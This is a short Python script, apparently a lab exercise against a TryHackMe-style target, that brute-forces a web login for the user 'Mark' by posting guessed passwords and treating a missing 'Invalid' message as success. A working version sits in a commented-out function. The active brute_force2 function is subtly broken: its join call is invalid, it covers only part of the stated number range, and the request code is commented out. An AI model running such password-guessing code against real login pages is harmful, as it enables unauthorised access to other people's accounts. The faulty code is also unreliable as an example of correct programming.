'''
Problem: brute force a web app login 
the username has been discovered to be 'Mark'
the password is known to be a four character string
the first character of the string is an uppercase letter
the last three characters are numbers between 000-999
'''

import requests
import string
url = "http://python.thm/labs/lab1/index.php"
username = 'Mark'

# Generate the letters
uppers = string.ascii_uppercase

#

# Generate list of 4-digit numeric 'passwords'
#password_list = [str(i).zfill(4) for i in range(10000)]


'''
def brute_force():
    for password in password_list:
            data = {"username":username,"password":password} # note that data fields must match the name of the field on the target
            response = requests.post(url, data=data) # method must match the method required by the target

            if "Invalid" not in response.text:
                    print(f"[+] Found valid credentials: {username}:{password}")
                    break   
            else:
                    print(f"[-] Attempted: {password}")

'''
def brute_force2():
    success_flag = 0
    while success_flag == 0:
        for letter in uppers:
            numbers = [str(i).zfill(3) for i in range(100)]
            password = ''.join(letter,numbers)
        if letter == 'B':
            success_flag =1
            exit
            '''
            data = {"username":username,"password":password} # note that data fields must match the name of the field on the target
            response = requests.post(url, data=data) # method must match the method required by the target

            if "Invalid" not in response.text:
                    print(f"[+] Found valid credentials: {username}:{password}")

                    break   
            else:
                    print(f"[-] Attempted: {password}")
            '''

if __name__ == '__main__':
    brute_force2()